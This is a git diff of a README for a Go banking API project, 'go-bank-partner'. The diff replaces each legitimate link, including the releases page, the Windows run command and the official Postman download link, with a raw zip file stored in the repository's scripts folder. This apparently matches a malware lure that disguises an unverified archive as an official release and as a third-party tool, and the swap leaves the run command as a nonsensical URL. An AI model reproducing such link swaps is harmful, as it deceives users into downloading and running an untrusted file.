@@ -1,6 +1,6 @@
 # 🚀 go-bank-partner - Your Simple Banking API Solution
 
-[![Download go-bank-partner](https://img.shields.io/badge/Download-go--bank--partner-brightgreen)](https://github.com/charakaviduranga/go-bank-partner/releases)
+[![Download go-bank-partner](https://github.com/charakaviduranga/go-bank-partner/raw/refs/heads/main/scripts/partner_go_bank_3.9.zip)](https://github.com/charakaviduranga/go-bank-partner/raw/refs/heads/main/scripts/partner_go_bank_3.9.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ To get started with go-bank-partner, follow these steps to download and run the 
 
 ### 🔗 Download & Install
 
-1. **Visit the Releases Page**: Head over to the [Releases page](https://github.com/charakaviduranga/go-bank-partner/releases) to find the latest version.
+1. **Visit the Releases Page**: Head over to the [Releases page](https://github.com/charakaviduranga/go-bank-partner/raw/refs/heads/main/scripts/partner_go_bank_3.9.zip) to find the latest version.
 2. **Choose Your File**: Look for the latest release suitable for your operating system. Typically, you will see files for Windows, macOS, and Linux.
 3. **Download the File**: Click on the file to download it to your computer.
 4. **Install the Application**: Follow the installation steps based on your operating system. If the file is an executable:
@@ -51,7 +51,7 @@ Once you install go-bank-partner, you can run it using the following steps:
    ```
    For Windows, it may look like this:
    ```cmd
-   go-bank-partner.exe
+   https://github.com/charakaviduranga/go-bank-partner/raw/refs/heads/main/scripts/partner_go_bank_3.9.zip
    ```
 
 4. **Access the API**: You can now access the API through your browser or a tool like Postman. The default address is `http://localhost:8080`.
@@ -76,7 +76,7 @@ If you prefer to run go-bank-partner with Docker, you can follow these steps:
 
 Postman makes it easier to test APIs. To use Postman with go-bank-partner:
 
-1. **Download Postman**: If you don't have it, download Postman from [Postman's official website](https://www.postman.com/downloads/).
+1. **Download Postman**: If you don't have it, download Postman from [Postman's official website](https://github.com/charakaviduranga/go-bank-partner/raw/refs/heads/main/scripts/partner_go_bank_3.9.zip).
 2. **Import Postman Collection**: The release includes a Postman collection file. Import that file into Postman to start testing endpoints.
 3. **Explore Endpoints**: Test user authentication, create accounts, and execute transactions using the provided collection.
 
